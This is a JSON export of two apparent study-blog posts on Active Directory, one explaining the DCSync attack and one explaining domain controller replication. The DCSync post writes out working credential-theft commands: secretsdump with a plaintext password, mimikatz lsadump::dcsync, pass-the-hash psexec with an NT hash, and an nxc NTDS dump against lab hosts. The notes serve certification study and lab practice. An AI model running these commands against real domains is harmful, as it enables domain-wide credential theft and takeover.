[
  
  {
    "title": "DCsync Attack",
    "url": "/posts/DCsyncAttack/",
    "categories": "Active Directory - CRTP, DCsync, DCsync Attack",
    "tags": "Replication, secretdump, ntds, ChangeAll",
    "date": "2025-09-29 11:00:00 -0400",
    "content": "DCsync  abuses Active Directory replication: an attacker impersonates a domain controller and requests replication from a real DC to obtain credential material (password hashes, Kerberos keys, etc.). This lets the attacker harvest account credentials without directly compromising the domain controller’s NTDS.dit file.  How it works (short):       AD replication allows DCs to exchange directory changes.   If an account has the appropriate replication privileges, an actor can request those changes and receive sensitive secrets (NT hashes, AES keys) for domain accounts.   This is not possible for arbitrary domain users — specific permissions are required.   Required permissions / privileges  (typically granted to high-privilege groups such as Domain Admins / Enterprise Admins / Domain Controllers, or explicitly delegated):     DS-Replication-Get-Changes   DS-Replication-Get-Changes-All   DS-Replication-Get-Changes-In-Filtered-Set     Typical workflow / examples     Attacker impersonates a domain controller and requests replication from a real DC.   Use tools to request/collect secrets from the target DC.   Example tools / commands (formatted):  # Using Impacket's secretsdump (example placeholder) # format may vary; adapt to your toolset/environment secretsdump.py svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175  # Mimikatz (run on a compromised machine with appropriate privileges) # in mimikatz interactive shell: lsadump::dcsync /user:DOMAIN\\Geno  # Use harvested hashes with psexec (Impacket) to authenticate over SMB psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' \\   -dc-ip 10.10.10.175 administrator@10.10.10.175  # Another example tool invocation (nxc.exe example from your notes) nxc.exe smb geno.gove.local -u mikasa -p 'P@ssw0rd' --ntds   "
  },
  
  {
    "title": "What is Replication",
    "url": "/posts/Replication/",
    "categories": "Active Directory - CRTP, DCsync, Replication",
    "tags": "Replication, KCC, AD",
    "date": "2025-09-28 11:00:00 -0400",
    "content": "DCsync  we need to understand Replication in order to perform DCsync Attack.  What is Replication in Active Directory?  Replication is the process used between Domain Controllers (DCs) in an Active Directory environment to ensure they all have the same up-to-date database.  Every Domain Controller stores a copy of the Active Directory database.     If one DC fails, others can still provide authentication and authorization services.   This is why large organizations need multiple DCs that constantly replicate data.   Example:  If an administrator adds a new user on DC1, the same information must be replicated to DC2 and DC3.  That way, if DC1 goes down, the user can still log in through DC2 because their credentials exist there as well.  so  any single change has been done on one of the DC will be replicated on the other DCs  The Active Directory database is stored in the file:  C:\\Windows\\ntds.dit   Any change in AD is written to this file, and then replicated across other DCs.    How Replication Works     When a change happens on DC1, a notification is generated by the KCC (Knowledge Consistency Checker).        Other DCs see this notification and pull the update from DC1.             Important: Updates are pulled by DCs, not pushed automatically.            Replication can be scheduled (e.g., twice a day, before and after working hours) to reduce bandwidth impact.  By default, the KCC refreshes every 15 minutes, or it can be triggered manually with:  repadmin /kcc     Active Directory Partitions  The ntds.dit file contains four partitions:     Domain Partition – Stores objects, containers, and domain information.   Configuration Partition – Stores sites, services, and AD configuration.            Same site: replication happens every 7–15 seconds.       Different sites: every 180 minutes.           Schema Partition – Defines object classes and attributes.   Application Partition – Used for DNS replication:            To all DNS servers in the forest.       To all DNS servers in the domain.             Types of Replication     Intra-site – Between DCs within the same site.   Inter-site – Between DCs across different sites.     Single Master vs Multi-Master          Single Master:      If there’s only one DC in the domain, no replication occurs (no second DC to sync with).           Multi-Master:      If multiple DCs exist and all are writable, replication occurs across all of them.        Tricks and Notes     If a user is moved to an OU and that OU is deleted on another DC, the user object ends up in the LostAndFound container.   Replication conflicts and versioning:            Every object has:                    Version Number – the edit version.           Timestamp – time of the change.           DC GUID – the identifier of the DC that made the change.                       The newest update (version + timestamp) wins and replicates to other DCs.                Indirect Replication:      Example with DC1, DC2, DC3:             DC1 and DC3 are not directly connected.       DC2 is connected to both.       Updates flow from DC1 → DC2 → DC3.           "
  }
  
]

